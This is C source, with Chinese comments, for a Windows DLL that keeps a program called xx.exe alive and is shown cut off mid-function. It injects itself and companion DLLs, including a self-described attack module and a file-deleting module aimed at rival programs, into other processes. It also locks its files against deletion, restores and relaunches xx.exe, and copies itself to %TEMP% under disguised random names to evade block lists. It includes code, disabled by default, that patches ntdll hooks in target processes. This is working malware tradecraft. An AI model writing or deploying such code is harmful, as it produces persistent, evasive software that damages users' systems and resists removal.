/*
 * svcguard.dll - 守护与复活（日志格式化已修正）
 * 编译：gcc -shared -o svcguard.dll deamon.c -ladvapi32 -lpsapi -lshell32 -static -s -O2
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* ---- 构建标记导出：注入方/加载方用它校验"拿到的确实是同一版二进制" ---- */
__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }

/* guard.dll 部署到几个宿主进程（同会话） */
#define GUARD_HOST_MAX  4

static HANDLE g_hSharedMem = NULL;
static PVOID  g_pSharedView = NULL;
static WCHAR  g_szXxExePath[MAX_PATH] = L"";
static WCHAR  g_szWindowDllPath[MAX_PATH] = L"";
static WCHAR  g_szDeamonDllPath[MAX_PATH] = L"";
static WCHAR  g_szGuardDllPath[MAX_PATH] = L"";
static WCHAR  g_szOwnDir[MAX_PATH] = L"";
static DWORD  g_guardPids[GUARD_HOST_MAX] = { 0 };
static int    g_guardCount = 0;
static volatile LONG g_bExitFlag = 0;
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;
static HANDLE  g_hSingleton = NULL;      /* 进程内单例（持有到进程结束） */
static ULONGLONG g_dwNameToken = 0;       /* 会话随机名 token：只由 XxSetNames 送进来 */

static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}
static HMODULE g_hSelfModule = NULL;     /* 自身模块句柄（摘链前缓存） */
static WCHAR   g_szSelfPath[MAX_PATH] = L"";  /* 自身 dll 全路径（摘链前缓存） */
/* atkcore.dll：**攻击**模块。以前只由 xx.exe 加载，xx 一被杀就再没有任何攻击者，
   yy 自然"杀掉 xx 就活着"。现在由 svcguard 把它注入宿主：
   宿主里的 atkcore 会自己起 AttackLoop（见 killtools.c DllMain），xx 死了照样杀。 */
static WCHAR g_szInjectAtk[MAX_PATH] = L"";
static WCHAR g_szAtkDllPath[MAX_PATH] = L"";
/* dedery.dll（源码 deleter.c）：全盘清道夫（搜 yy.exe / lenovo_fix.exe / yyguard.dll 及其还原源 → 关句柄 → 强删） */
static WCHAR g_szDeleterDllPath[MAX_PATH] = L"";
static WCHAR g_szInjectDel[MAX_PATH] = L"";

/* 前置声明（HeartbeatMonitor 会用到后面定义的这两个判定） */
static BOOL IsRunningInXxExe(void);
static BOOL IsProtected(LPCWSTR name);
static BOOL IsSafeInjectTarget(DWORD pid, LPCWSTR leaf);
static BOOL IsDesktopHostLeaf(LPCWSTR leaf);
static BOOL InitPaths(void);
static void ForceReinjectWindowToHosts(void);

/* 注入缓存：避免每轮对所有进程反复 OpenProcess / EnumProcessModules / 远程线程。
   每 INJ_REFRESH_MS 全量重扫一次，兼顾 PID 复用与后续被卸载的情况。 */
#define INJ_CACHE_MAX   2048
#define INJ_REFRESH_MS  20000
static DWORD g_injPid[INJ_CACHE_MAX];
static int   g_injCount = 0;
static DWORD g_injLastRefresh = 0;

static BOOL InjCacheHas(DWORD pid) {
    for (int i = 0; i < g_injCount; i++)
        if (g_injPid[i] == pid) return TRUE;
    return FALSE;
}
static void InjCacheAdd(DWORD pid) {
    if (g_injCount < INJ_CACHE_MAX) g_injPid[g_injCount++] = pid;
}

/* 被目标明确拒绝过的 PID（远端 LoadLibrary 返回 0：32 位进程、受保护进程、
   或被对手反注入拦住且我们拆不掉）。拉黑一段时间，避免每 10 秒重复刷屏。 */
#define REJECT_MAX      64
#define REJECT_TTL_MS   120000
static DWORD g_rejPid[REJECT_MAX];
static DWORD g_rejTick[REJECT_MAX];
static int   g_rejCount = 0;

static BOOL RejectedRecently(DWORD pid) {
    DWORD now = GetTickCount();
    for (int i = 0; i < g_rejCount; i++) {
        if (g_rejPid[i] != pid) continue;
        if (now - g_rejTick[i] < REJECT_TTL_MS) return TRUE;
        return FALSE;                       /* 过期：放行重试 */
    }
    return FALSE;
}

static void MarkRejected(DWORD pid) {
    for (int i = 0; i < g_rejCount; i++) {
        if (g_rejPid[i] == pid) { g_rejTick[i] = GetTickCount(); return; }
    }
    if (g_rejCount < REJECT_MAX) {
        g_rejPid[g_rejCount] = pid;
        g_rejTick[g_rejCount] = GetTickCount();
        g_rejCount++;
    }
}
static void InjCacheRefreshIfDue(void) {
    DWORD now = GetTickCount();
    if (g_injLastRefresh == 0 || now - g_injLastRefresh >= INJ_REFRESH_MS) {
        g_injCount = 0;
        g_injLastRefresh = now;
    }
}

static void EnsureLogInit(void) {
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    if (!g_pSharedView) {
        g_hSharedMem = XXOpenShared();
        if (g_hSharedMem)
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
    }
}

/* 日志：共享内存窗口 + %TEMP%\xx_debug.log（没有弹窗时只能靠文件日志排查） */
static void WriteDeamonLog(const WCHAR* fmt, ...) {
    WCHAR szLine[512];
    WCHAR fline[640];
    va_list args;

    EnsureLogInit();

    va_start(args, fmt);
    _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 先落文件：g_pSharedView 为空时原来的实现直接 return，什么都看不到 */
    _snwprintf(fline, _countof(fline) - 1, L"[deamon][pid=%lu] %s\r\n",
               GetCurrentProcessId(), szLine);
    fline[_countof(fline) - 1] = L'\0';
    XXFileLog(fline);

    if (!g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [deamon] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen) {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    } else {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }
    LeaveCriticalSection(&g_csLog);
}

static BOOL OpenSharedMemory(void) {
    for (int i = 0; i < 5; i++) {
        g_hSharedMem = XXOpenShared();
        if (g_hSharedMem) {
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
            if (g_pSharedView) return TRUE;
            CloseHandle(g_hSharedMem);
        }
        Sleep(1000);
    }
    return FALSE;
}

static BOOL InitPaths(void) {
    WCHAR dllPath[MAX_PATH];
    /* 注入副本是从 %TEMP% 的改名文件加载的，按自身模块路径推目录会推到 %TEMP%，
       xx.exe / window.dll / guard.dll / 我方文件锁全会指错地方。
       所以优先用共享内存里 xx.exe 记下的自身路径推出的目录。 */
    if (g_pSharedView && XX_XXPATH(g_pSharedView)[0]) {
        XXDirNameOf(XX_XXPATH(g_pSharedView), dllPath, MAX_PATH);
    } else {
        /* 退化：用 DllMain 缓存的自身路径（模块已从 PEB 摘除，GetModuleHandle 查不到） */
        if (g_szSelfPath[0]) {
            wcsncpy_s(dllPath, MAX_PATH, g_szSelfPath, _TRUNCATE);
        } else if (g_hSelfModule) {
            if (!GetModuleFileNameW(g_hSelfModule, dllPath, MAX_PATH)) return FALSE;
        } else if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH)) {
            return FALSE;
        }
        {
            WCHAR *ps = wcsrchr(dllPath, L'\\');
            if (ps) ps[1] = L'\0';       /* 截断到目录 */
            else wcscat_s(dllPath, MAX_PATH, L"\\");
        }
    }

    swprintf_s(g_szXxExePath, MAX_PATH, L"%sxx.exe", dllPath);
    swprintf_s(g_szWindowDllPath, MAX_PATH, L"%swindow.dll", dllPath);
    swprintf_s(g_szDeamonDllPath, MAX_PATH, L"%ssvcguard.dll", dllPath);
    swprintf_s(g_szGuardDllPath, MAX_PATH, L"%sguard.dll", dllPath);
    swprintf_s(g_szAtkDllPath, MAX_PATH, L"%satkcore.dll", dllPath);
    swprintf_s(g_szDeleterDllPath, MAX_PATH, L"%sdedery.dll", dllPath);
    wcsncpy_s(g_szOwnDir, MAX_PATH, dllPath, _TRUNCATE);

    WriteDeamonLog(L"Paths: xx=%ls, window=%ls, guard=%ls\n",
                   g_szXxExePath, g_szWindowDllPath, g_szGuardDllPath);
    return TRUE;
}

/* ================== 我方文件锁 ==================
   Windows 允许删除正在运行的镜像（加载器带 FILE_SHARE_DELETE），所以我们的
   xx.exe / dll / 备份文件默认能被对手直接删掉；文件一旦没了，新的注入就没有
   东西可注入，整条复活链会静默失效（实测确认：不持锁时删运行中的 exe 是成功的）。

   这里用 access=0 + FILE_SHARE_READ 持住每个文件（实测结论）：
     - share=0 连正在运行的镜像都打不开，必须留 FILE_SHARE_READ；
     - 留了 READ 之后：删除 / 改名 / 覆盖写入 全部被拒（跨进程同样有效），
       而读取与 LoadLibrary 仍然成功 —— 也就是不影响我们自己 CopyFileW 备份/还原
       与把 dll 注入到别的进程。 */
static const WCHAR *g_ownFiles[] = {
    L"xx.exe", L"svcguard.dll", L"window.dll", L"atkcore.dll",
    L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll",
    NULL   /* 备份文件名每会话随机，运行时由 XXBackupNameW 补 */
};
#define OWN_LOCK_MAX 16
static HANDLE g_ownLocks[OWN_LOCK_MAX];

static void LockOwnFiles(void) {
    int i;
    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return;
    for (i = 0; g_ownFiles[i] && i < OWN_LOCK_MAX; i++) {
        WCHAR path[MAX_PATH];
        HANDLE h;
        if (g_ownLocks[i]) continue;
        swprintf_s(path, MAX_PATH, L"%s%s", g_szOwnDir, g_ownFiles[i]);
        h = CreateFileW(path, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) g_ownLocks[i] = h;
    }
}

/* 每个宿主里的 svcguard 都持一份：xx.exe 被杀后锁依然在，文件删不掉 */
static DWORD WINAPI OwnFileShieldThread(LPVOID lp) {
    UNREFERENCED_PARAMETER(lp);
    Sleep(1500);
    for (;;) {
        LockOwnFiles();
        Sleep(2000);
    }
    return 0;
}

/* xx.exe 被对手删除时，从同目录的随机备份文件还原。
   两个细节：
     ① 要清只读的是**目标文件本身**（defense 给 xx.exe 置过 FILE_ATTRIBUTE_READONLY，
        不清掉 CopyFileW 覆盖会失败），而且不能拿共享内存指针当路径用 ——
        原来写的是 SetFileAttributesW(XX_XXPATH(g_pSharedView), ...)，
        共享内存没建起来时就是一次空指针解引用；
     ② 路径一律用 InitPaths 算好的 g_szXxExePath（目录来自共享内存里的 xx 路径）。 */
static void EnsureXxExeExists(void) {
    WCHAR dir[MAX_PATH], bak[MAX_PATH];
    WCHAR *p;

    if (!g_szXxExePath[0]) return;
    if (GetFileAttributesW(g_szXxExePath) != INVALID_FILE_ATTRIBUTES) return;

    wcscpy_s(dir, MAX_PATH, g_szXxExePath);
    p = wcsrchr(dir, L'\\');
    if (p) *(p + 1) = L'\0';
    {   /* 随机备份名：r<8hex>.bin，由会话盐派生（二进制无明文） */
        WCHAR nm[32];
        XXBackupNameW(g_pSharedView, nm, _countof(nm));
        swprintf_s(bak, MAX_PATH, L"%s%ls", dir, nm);
        SecureZeroMemory(nm, sizeof(nm));
    }
    if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
        /* 还原目标自己可能被置了只读（或删除待决）：先清成普通文件再覆盖 */
        SetFileAttributesW(g_szXxExePath, FILE_ATTRIBUTE_NORMAL);
        if (CopyFileW(bak, g_szXxExePath, FALSE))
            WriteDeamonLog(L"已从备份还原 xx.exe: %ls\n", g_szXxExePath);
        else
            WriteDeamonLog(L"从备份还原 xx.exe 失败: %ls err=%lu\n",
                           g_szXxExePath, GetLastError());
    }
}

/* 弹窗存活判据 = 共享内存心跳计数器（window.dll 弹窗每 500ms 递增一次）。
   不再等待事件对象：手动重置事件 SetEvent 之后永不超时，超时复活分支是死代码，
   而且忙等会吃满一个核。监视循环见下方 HeartbeatMonitor（定义在 RespawnXX 之后）。 */

static BOOL IsXxProcessRunning(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD known = XXSharedInstancePid();
    BOOL found = FALSE;

    if (h == INVALID_HANDLE_VALUE) return FALSE;
    if (Process32FirstW(h, &pe)) {
        do {
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            /* **不打开进程**：xx 的 DACL 拒绝 Everyone，OpenProcess 必然失败；
                判活只需要进程表 —— xx.exe 按镜像名认，改名的接管副本按
                "共享内存记录的那个实例 PID"认（见 xxipc.h 的 XXSnapIsOurInstance）。 */
            if (XXSnapIsOurInstance(pe.szExeFile, pe.th32ProcessID, known)) { found = TRUE; break; }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return found;
}

/* 复活必须发生在 xx 原来的登录会话里：别的会话（尤其 session 0）拉起来的
   xx.exe 弹窗在非交互桌面上，等于白复活还占资源。共享内存读不到就放行。 */
static BOOL RespawnSessionOk(void) {
    DWORD mine = 0;
    LONG  rec;
    if (!g_pSharedView) return TRUE;
    rec = XX_SESSION(g_pSharedView);
    if (rec == 0) return TRUE;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return TRUE;
    if ((LONG)mine == rec) return TRUE;
    WriteDeamonLog(L"本实例在会话 %lu，xx 上次在会话 %ld，跳过复活（避免影子实例）\n", mine, rec);
    return FALSE;
}

/* 把一份实例拉起来：优先"控制台会话"，其次同会话回退，最后 ShellExecute。
   必须把它拉进**控制台会话**：复活方自己可能跑在 session 0（services.exe 之类 SYSTEM
   宿主），CreateProcess 会让它继承 session 0 —— 弹窗画在不可见桌面上、Windows 还会弹
   "交互式服务检测"，等于没有弹窗（实测踩到）。
   三种方式都失败才返回 FALSE，让调用方决定是否换目标（例如副本坏了退回交付本体）。 */
static BOOL LaunchInstance(LPCWSTR path) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    DWORD mySid = 0, conSid = XXConsoleSession(), newPid = 0;

    if (!path || !path[0]) return FALSE;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mySid)) mySid = 0;

    if (XXLaunchInConsoleSession(path, FALSE, &newPid) && newPid) {
        WriteDeamonLog(L"复活方式=控制台会话拉起 成功 新PID=%lu（本实例会话=%lu 控制台会话=%lu）\n",
                       newPid, mySid, conSid);
        return TRUE;
    }
    if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WriteDeamonLog(L"复活方式=同会话回退 新PID=%lu（会话=%lu，弹窗可能不可见）\n",
                       pi.dwProcessId, mySid);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    if ((INT_PTR)ShellExecuteW(NULL, L"open", path, NULL, NULL, SW_HIDE) > 32) {
        WriteDeamonLog(L"复活方式=ShellExecute（跨会话拉起失败，可能缺 SYSTEM 权限）\n");
        return TRUE;
    }
    WriteDeamonLog(L"三种拉起方式全部失败: %ls err=%lu\n", path, GetLastError());
    return FALSE;
}

static void RespawnXX(BOOL bForce) {
    /* 多实例（各宿主里的 svcguard + defense 看门狗）可能同时判定需要复活，
       用命名互斥锁串行化，避免同一时刻拉起多个 xx.exe。 */
    WCHAR szOnce[128];
    XXNamedObject(szOnce, _countof(szOnce), TRUE, XX_PURPOSE_RESPAWN, NameTok(), 0);
    HANDLE hOnce = CreateMutexW(NULL, FALSE, szOnce);
    DWORD  w = hOnce ? WaitForSingleObject(hOnce, 3000) : WAIT_OBJECT_0;
    BOOL   bOwn = (hOnce != NULL && (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED));

    if (hOnce && !bOwn) {
        CloseHandle(hOnce);
        WriteDeamonLog(L"另一个实例正在复活 xx.exe，跳过\n");
        return;
    }

    if (!RespawnSessionOk()) {
        if (bOwn) ReleaseMutex(hOnce);
        if (hOnce) CloseHandle(hOnce);
        return;
    }

    /* 先把交付本体补回来（被对手删了就从备份还原），再决定**拉哪一份**：
       判据见 xxipc.h 的 XXRespawnTargetPath —— 优先 %TEMP% 下改名的副本
       （对手按名杀 xx.exe），没有再退回交付本体。 */
    EnsureXxExeExists();
    {
        WCHAR szTarget[MAX_PATH] = L"";

        if (!XXRespawnTargetPath(g_pSharedView, g_szXxExePath, szTarget, MAX_PATH)) {
            WriteDeamonLog(L"没有可复活的实例（xx.exe 与备份文件都不可用）: %ls\n", g_szXxExePath);
        } else if (IsXxProcessRunning() && !bForce) {
            /* 已有实例在运行就不重复拉起（避免与 defense.dll 看门狗双重复活） */
            WriteDeamonLog(L"xx 已在运行，跳过复活\n");
        } else {
            WriteDeamonLog(L"检测到 xx 心跳丢失，准备复活: %ls\n", szTarget);
            if (IsXxProcessRunning()) {
                /* bForce：还活着一个"不产生弹窗"的实例（典型是被对手挂起后终止失败）。
                   **解挂不归 svcguard 管**：需要 xx 进程句柄的是宿主里的 guard.dll，
                   它用的是 xx 在收紧 DACL 之前打开、再 DuplicateHandle 交接进宿主的
                   那个句柄（见 README 6.1.1）。svcguard 只负责"没了就再拉一份"，
                   所以这里不 OpenProcess、也不去恢复线程 —— 有实例总比没弹窗强。 */
                WriteDeamonLog(L"已有实例但心跳仍停摆 -> 强制再拉一份（解挂交给宿主里的 guard.dll）\n");
            }
            if (!LaunchInstance(szTarget)) {
                /* 首选的副本拉不起来（文件损坏/被占/被删）：退回交付本体再试一次，
                   别因为"优选了副本"反而一个实例都起不来。 */
                if (_wcsicmp(szTarget, g_szXxExePath) != 0) {
                    WriteDeamonLog(L"拉起 %ls 失败 -> 退回交付本体 %ls\n", szTarget, g_szXxExePath);
                    LaunchInstance(g_szXxExePath);
                }
            }
        }
    }

    if (bOwn) ReleaseMutex(hOnce);
    if (hOnce) CloseHandle(hOnce);
}

/* 心跳停摆但 xx.exe 还活着时，RespawnXX 会因为"已有实例在运行"而跳过，
   弹窗可能就永远回不来（window.dll 被对手卸载/加载失败）。这里补一刀：
   若本实例就在 xx.exe 内，且 window.dll 不在本进程里，就地重新加载。 */
static void EnsureWindowModuleHere(void) {
    if (!IsRunningInXxExe()) return;
    if (GetModuleHandleW(L"window.dll")) return;
    if (g_szWindowDllPath[0] == L'\0' && !InitPaths()) return;
    if (LoadLibraryW(g_szWindowDllPath))
        WriteDeamonLog(L"心跳停摆：已重新加载 window.dll\n");
    else
        WriteDeamonLog(L"心跳停摆：重新加载 window.dll 失败 err=%lu\n", GetLastError());
}

static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
    LONG lastTick;
    DWORD lastChange;
    DWORD lastRecover = 0;
    BOOL bStale = FALSE;

    UNREFERENCED_PARAMETER(lp);
    WriteDeamonLog(L"HeartbeatMonitor started\n");

    /* 共享内存可能比本实例晚就绪；拿不到就等着，绝不因此自我卸载
       （模块已注入宿主进程，退出就再也不会被重新注入）。 */
    for (;;) {
        if (g_bExitFlag) return 0;
        if (!g_pSharedView) OpenSharedMemory();
        if (g_pSharedView) break;
        Sleep(500);
    }
    if (g_szXxExePath[0] == L'\0' && !InitPaths())
        WriteDeamonLog(L"InitPaths failed\n");

    InterlockedIncrement(&XX_COUNTER(g_pSharedView));

    lastTick = XX_HB_TICK(g_pSharedView);
    lastChange = GetTickCount();

    while (!g_bExitFlag) {
        LONG cur;
        DWORD now;

        Sleep(HEARTBEAT_POLL_MS_DEMON);   /* 复活扫描频率：80ms */
        now = GetTickCount();
        cur = XX_HB_TICK(g_pSharedView);

        if (cur != lastTick) {              /* 弹窗还活着 */
            lastTick = cur;
            lastChange = now;
            bStale = FALSE;
            continue;
        }
        if (now - lastChange < HEARTBEAT_STALE_MS) continue;

        if (!bStale) {
            bStale = TRUE;
            WriteDeamonLog(L"弹窗心跳停摆 %lums，开始恢复\n",
                           (unsigned long)(now - lastChange));
        }
        /* 恢复动作按 HEARTBEAT_RECOVER_MS 节流：xx 还活着时 RespawnXX 只会空转，
           没必要每 2.5 秒重扫一遍进程表。 */
        if (lastRecover != 0 && now - lastRecover < HEARTBEAT_RECOVER_MS) continue;

        lastRecover = now;
        lastChange = now;
        lastTick = XX_HB_TICK(g_pSharedView);
        /* 三级恢复：先把本进程的弹窗模块补上，再让宿主里死掉的弹窗线程复活，
           最后拉起 xx.exe。走到这里说明心跳已经停摆（≥2.5 秒没弹窗），
           所以复活用强制模式：若存在一个"活着但不产弹窗"的 xx.exe（对手把线程
           全挂起后终止失败就会留下这种僵住进程），不能因为"已在运行"就永远跳过。
           整个恢复动作已按 HEARTBEAT_RECOVER_MS(10s) 节流，不会造成进程风暴。 */
        EnsureWindowModuleHere();
        ForceReinjectWindowToHosts();
        RespawnXX(TRUE);
    }

    InterlockedDecrement(&XX_COUNTER(g_pSharedView));
    return 0;
}

static BOOL IsProtected(LPCWSTR name) {
    static LPCWSTR list[] = {
        L"System", L"smss.exe", L"csrss.exe", L"wininit.exe",
        L"services.exe", L"lsass.exe", L"winlogon.exe",
        L"spoolsv.exe", L"dwm.exe", L"taskhost.exe",
        /* notepad.exe：atkcore 把 notepad 当"敌方宿主"击杀，若我们也往
           notepad 注入 window.dll，弹窗就可能被自己 30ms 一轮的攻击秒掉。 */
        L"notepad.exe", NULL
    };
    for (int i = 0; list[i]; i++)
        if (_wcsicmp(name, list[i]) == 0) return TRUE;
    return FALSE;
}

/* ================== 反"反注入"：还原目标进程里被改写的 LdrLoadDll ==================
   对手会在自己的进程/宿主进程里 hook ntdll!LdrLoadDll，按键名把我们的
   svcguard.dll / window.dll 直接拒掉（LoadLibrary 返回 0）。这时 CreateRemoteThread
   本身是成功的，所以不看返回值就会误报"注入成功"，现象正是"别的进程里没有我们的 dll"。
   这里注入前先把目标进程里被改掉的 LdrLoadDll 前导字节写回原始值 ——
   我们已经持有 PROCESS_VM_WRITE/VM_OPERATION。 */
#define LDR_PATCH_LEN 16

/* 原始字节必须来自磁盘上的 ntdll（SEC_IMAGE 映射，内容干净）：
   不能读我们自己进程里的字节 —— defense.dll 在 xx.exe 内就把 LdrLoadDll hook 了，
   照抄会把我们自己的 hook 复制到目标进程。 */
static BOOL ReadPristineNtdllBytes(ULONG_PTR rva, BYTE *out, SIZE_T len) {
    WCHAR sys[MAX_PATH], path[MAX_PATH];
    HANDLE hf, hm = NULL;
    void *view = NULL;
    BOOL ok = FALSE;

    if (!GetSystemDirectoryW(sys, MAX_PATH)) return FALSE;
    swprintf_s(path, MAX_PATH, L"%s\\ntdll.dll", sys);
    hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    hm = CreateFileMappingW(hf, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (hm) {
        view = MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
        if (view) {
            memcpy(out, (BYTE *)view + rva, len);
            ok = TRUE;
            UnmapViewOfFile(view);
        }
        CloseHandle(hm);
    }
    CloseHandle(hf);
    return ok;
}

static void RepairTargetLdrHook(HANDLE hProc, DWORD pid) {
    /* **默认关闭**：这个函数往目标进程的 ntdll!LdrLoadDll 代码页回写"原始字节"，
       而不同 Win7 补丁级别的 LdrLoadDll 前导指令长度并不一致，按固定 LDR_PATCH_LEN 回写
       很容易劈坏函数 → 目标一调 LoadLibrary 就崩。用户实测"注入哪个进程哪个进程就崩、
       explorer 频繁崩溃"，这是头号嫌疑。要启用就把下面的 return 去掉。 */
    UNREFERENCED_PARAMETER(hProc); UNREFERENCED_PARAMETER(pid);
    if (1) return;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    BYTE *fn;
    BYTE cur[LDR_PATCH_LEN], pristine[LDR_PATCH_LEN];
    SIZE_T rd = 0;
    DWORD old = 0;

    if (!hNtdll) return;
    fn = (BYTE *)GetProcAddress(hNtdll, "LdrLoadDll");
    if (!fn) return;

    if (!ReadProcessMemory(hProc, fn, cur, LDR_PATCH_LEN, &rd) || rd != LDR_PATCH_LEN)
        return;
    if (!ReadPristineNtdllBytes((ULONG_PTR)(fn - (BYTE *)hNtdll), pristine, LDR_PATCH_LEN))
        return;
    if (memcmp(cur, pristine, LDR_PATCH_LEN) == 0) return;      /* 没被改，正常 */

    if (VirtualProtectEx(hProc, fn, LDR_PATCH_LEN, PAGE_EXECUTE_READWRITE, &old)) {
        if (WriteProcessMemory(hProc, fn, pristine, LDR_PATCH_LEN, &rd))
            WriteDeamonLog(L"已还原 PID=%lu 里被改写的 LdrLoadDll（反注入 hook）\n", pid);
        VirtualProtectEx(hProc, fn, LDR_PATCH_LEN, old, &old);
    }
}

/* ================== 注入用副本（改名 + 挪到 %TEMP%） ==================
   对手的反注入名单（svcguard.dll / window.dll / guard.dll）和删文件名单都是按
   文件名来的。注入前把 dll 复制成 %TEMP% 下一个像系统组件的随机名字，两个名单
   同时失效；副本被删会在下一轮注入前自动重新复制。
   名字里的 salt 由 xx.exe 生成并写进共享内存，所以所有实例算出的名字一致 ——
   一轮只留固定几份副本，而不是每个宿主各留一份。 */
static WCHAR g_szInjectSvc[MAX_PATH] = L"";
static WCHAR g_szInjectWin[MAX_PATH] = L"";
static WCHAR g_szInjectGuard[MAX_PATH] = L"";
static BOOL  g_bInjectNamesLogged = FALSE;

/* ================== 注入日志：5 秒一条，共享日志里只留最近 3 条 ==================
   用户实测：注入日志刷屏，把弹窗里的日志区占满，真正有用的信息被挤掉。
   规则：
     · **5 秒内最多一条**（全局节流，不管注入了几个进程）；
     · 每条带 `[INJ]` 前缀；
     · 写之前先把共享日志里**更早的 [INJ] 行删掉**，只保留最近 3 条 ——
       其它日志（攻击/防御/复活）一行不动。 */
#define INJ_LOG_MIN_GAP_MS 5000
#define INJ_LOG_KEEP       3

static void PruneInjLines(void)
{
    WCHAR *pLog;
    size_t maxLen;
    WCHAR *src, *dst;

    if (!g_pSharedView) return;
    pLog   = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;

    /* 从尾往前数 [INJ] 行：前 INJ_LOG_KEEP 条保留，其余删掉 */
    {
        WCHAR *s = pLog;
        WCHAR *keepFrom = pLog;
        int total = 0, i;
        while ((s = wcsstr(s, L"[INJ]")) != NULL) { total++; s += 5; }
        if (total <= INJ_LOG_KEEP) return;
        i = total - INJ_LOG_KEEP;
        s = pLog;
        while (i-- > 0 && (s = wcsstr(s, L"[INJ]")) != NULL) {
            WCHAR *lineStart = s;
            while (lineStart > pLog && lineStart[-1] != L'\n') lineStart--;
            keepFrom = lineStart;
            s += 5;
        }
        /* 把 keepFrom 之前（含被删段）压掉：保留 keepFrom..end */
        src = keepFrom;
        dst = pLog;
        while (*src && (size_t)(dst - pLog) < maxLen) *dst++ = *src++;
        *dst = L'\0';
    }
}

static void WriteInjectLog(const WCHAR *fmt, ...)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    WCHAR line[400];
    va_list ap;

    if (s_dwLast && (DWORD)(now - s_dwLast) < INJ_LOG_MIN_GAP_MS) return;   /* 5 秒节流 */
    s_dwLast = now;

    va_start(ap, fmt);
    _vsnwprintf(line, _countof(line) - 1, fmt, ap);
    va_end(ap);
    line[_countof(line) - 1] = L'\0';

    PruneInjLines();
    WriteDeamonLog(L"[INJ] %ls\n", line);
}

static void RefreshInjectCopies(void) {
    DWORD salt = g_pSharedView ? XX_TMP_SALT(g_pSharedView) : 0;
    if (salt == 0) salt = 0x9E3779B9u;
    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return;

    XXMakeTempCopy(g_szDeamonDllPath, salt, g_szInjectSvc, MAX_PATH);
    XXMakeTempCopy(g_szWindowDllPath, salt, g_szInjectWin, MAX_PATH);
    XXMakeTempCopy(g_szGuardDllPath,  salt, g_szInjectGuard, MAX_PATH);
    XXMakeTempCopy(g_szAtkDllPath,    salt, g_szInjectAtk, MAX_PATH);
    XXMakeTempCopy(g_szDeleterDllPath, salt, g_szInjectDel, MAX_PATH);

    if (!g_bInjectNamesLogged && g_szInjectSvc[0] && g_szInjectWin[0]) {
        g_bInjectNamesLogged = TRUE;
        WriteDeamonLog(L"注入副本: svcguard=%ls window=%ls guard=%ls\n",
                       g_szInjectSvc, g_szInjectWin,
                       g_szInjectGuard[0] ? g_szInjectGuard : L"(未就绪)");
    }
}

static LPCWSTR InjectPathOf(int which) {
    switch (which) {
    case 0:  return g_szInjectSvc[0] ? g_szInjectSvc : g_szDeamonDllPath;
    case 1:  return g_szInjectWin[0] ? g_szInjectWin : g_szWindowDllPath;
